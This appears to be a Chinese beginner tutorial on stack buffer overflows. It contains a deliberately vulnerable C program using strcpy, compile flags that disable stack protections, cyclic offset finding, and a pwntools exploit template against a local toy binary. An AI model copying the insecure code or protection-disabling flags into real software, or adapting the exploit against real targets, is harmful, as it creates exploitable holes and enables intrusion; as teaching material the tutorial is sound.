# 栈溢出入门

## 一、什么是栈溢出

栈溢出（Stack Overflow）是最基础的二进制漏洞。当程序向栈上的缓冲区写入**超过其容量**的数据时，多余的数据会覆盖栈上的其他数据，包括**返回地址**，从而控制程序执行流。

## 二、栈的基本结构

函数调用时，栈的布局大致如下：

```
高地址
┌─────────────────┐
│   函数参数       │
├─────────────────┤
│   返回地址       │  ← 我们要覆盖的目标
├─────────────────┤
│   保存的ebp      │
├─────────────────┤
│   局部变量       │  ← 缓冲区在这里
│   (缓冲区)       │
└─────────────────┘
低地址
```

## 三、漏洞示例

### 有漏洞的 C 代码

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];  // 只有 64 字节
    strcpy(buffer, input);  // 没有检查长度！
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

`strcpy` 不检查输入长度，当输入超过 64 字节时就会发生溢出。

## 四、编译与保护检查

### 编译命令

```bash
gcc -m32 -fno-stack-protector -z execstack -o vuln vuln.c
```

参数说明：
- `-m32`：编译为 32 位程序
- `-fno-stack-protector`：关闭 Canary 保护
- `-z execstack`：栈可执行

### 检查保护机制

```bash
checksec --file=vuln
```

常见保护机制：
| 保护 | 说明 |
|------|------|
| NX/DEP | 栈不可执行 |
| Canary | 栈溢出检测 |
| ASLR | 地址随机化 |
| PIE | 位置无关可执行 |

## 五、利用步骤

### 1. 确定偏移量

用 pattern 计算返回地址的偏移：

```python
from pwn import *

# 生成 pattern
pattern = cyclic(100)
print(pattern)

# 程序崩溃后，用 cyclic_find 找偏移
# offset = cyclic_find(0x6161616c)
```

### 2. 构造 EXP

```python
from pwn import *

# 连接目标
p = process('./vuln')

# 偏移量（根据实际情况修改）
offset = 76

# 要跳转的地址（例如 system 函数或 gadget）
target_addr = 0xdeadbeef

# 构造 payload
payload = b'A' * offset       # 填充缓冲区
payload += p32(target_addr)   # 覆盖返回地址

# 发送 payload
p.sendline(payload)
p.interactive()
```

## 六、调试技巧

### GDB + Pwndbg

```bash
gdb ./vuln
```

常用命令：
```gdb
break main        # 下断点
run               # 运行
info registers    # 查看寄存器
x/10x $esp        # 查看栈
stepi / ni        # 单步执行
```

## 七、常见问题

1. **偏移量不对**：用 cyclic pattern 重新计算
2. **程序崩溃但没拿到 shell**：检查返回地址是否正确
3. **字符被截断**：注意 `\x00` 等坏字符
4. **环境不同导致地址变化**：关闭 ASLR 或用 leak 技术
